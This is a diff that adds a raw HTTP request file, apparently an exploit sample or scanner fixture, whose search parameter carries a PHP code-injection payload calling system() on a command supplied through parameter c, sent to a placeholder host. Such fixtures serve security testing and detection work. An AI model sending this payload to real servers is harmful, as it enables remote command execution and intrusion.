@@ -1,0 +1,4 @@
+GET /a?search=/*%00*/call_user_func_array('system',array($_GET[c])) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
